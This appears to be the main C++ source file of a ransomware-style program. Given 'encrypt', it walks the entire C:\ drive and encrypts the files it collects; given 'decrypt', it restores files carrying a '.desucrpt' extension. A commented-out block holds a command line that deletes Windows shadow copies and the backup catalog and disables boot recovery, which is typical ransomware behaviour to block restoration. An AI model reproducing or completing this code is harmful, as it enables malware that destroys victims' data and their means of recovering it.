
#include "stdafx.h"

int main(int argc, char **argv)
{
	std::string prgName(argv[0]);
	prgName = prgName.substr(prgName.find_last_of("\\") + 1);
	if (argc < 2) {
		std::cout << "insufficient amount of arguments" << std::endl;
		std::cout << "Usage: " << prgName << " encrypt/decrypt" << std::endl;
		return -1;
	}
	else {
		std::string decision(argv[1]);
		std::cout << argv[1] << std::endl;
		if (decision == "encrypt") {
			action = TRUE;
		}
		else if (decision == "decrypt") {
			action = FALSE;
		}
		else {
			std::cout << "Usage: " << prgName << " encrypt/decrypt" << std::endl;
			//system("pause");
			return -1;
		}
	}
	if (action == TRUE) {
		BOOL callResult;
		/*PROCESS_INFORMATION p_info;
		STARTUPINFO s_info;
		LPWSTR cmdline, programpath;

		memset(&s_info, 0, sizeof(s_info));
		memset(&p_info, 0, sizeof(p_info));
		s_info.cb = sizeof(s_info);
		//cmdline = _tcsdup(TEXT("/c echo meow\n"));
		cmdline = _tcsdup(TEXT("/c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet"));
		programpath = _tcsdup(TEXT("C:\\Windows\\System32\\cmd.exe"));

		if (CreateProcess(programpath, cmdline, NULL, NULL, 0, 0, NULL, NULL, &s_info, &p_info))
		{
			WaitForSingleObject(p_info.hProcess, INFINITE);
			CloseHandle(p_info.hProcess);
			CloseHandle(p_info.hThread);
		}*/
		initializeCrypt();
		callResult = writeKeyToFile();
		if (callResult == FALSE) {
			std::cout << "failed" << std::endl;
			return -1;
		}
		rWalking(L"C:\\", true);
		std::cout << "files were collected" << std::endl << "Encrypting..." << std::endl;
		iterateFilesDB(action);
		//startProcedureOnFile(L"C:\\Users\\delta\\desktop\\cryptorTest\\ayaya.webm");
		
		
	}
	if (action == FALSE) {
		BOOL callResult;
		callResult = importKeyFromFile();
		
		if (callResult == FALSE) {
			std::cout << "failed" << std::endl;
			return -1;
		}
		searchForEncryptedFiles(L"C:\\", true);
		std::cout << "files were collected" << std::endl << "Decrypting..." << std::endl;
		iterateFilesDB(action);
		//decryptProcedure(L"C:\\Users\\delta\\desktop\\cryptorTest\\ayaya.webm.desucrpt");
	}
	destroyKeys();
	
	
	//startProcedureOnFile(L"C:\\Users\\delta\\desktop\\cryptorTest\\ayaya.webm");
	//system("pause");
	//decryptProcedure(L"C:\\Users\\delta\\desktop\\cryptorTest\\ayaya.webm.desucrpt");
	
	//system("pause");
    return 0;
}

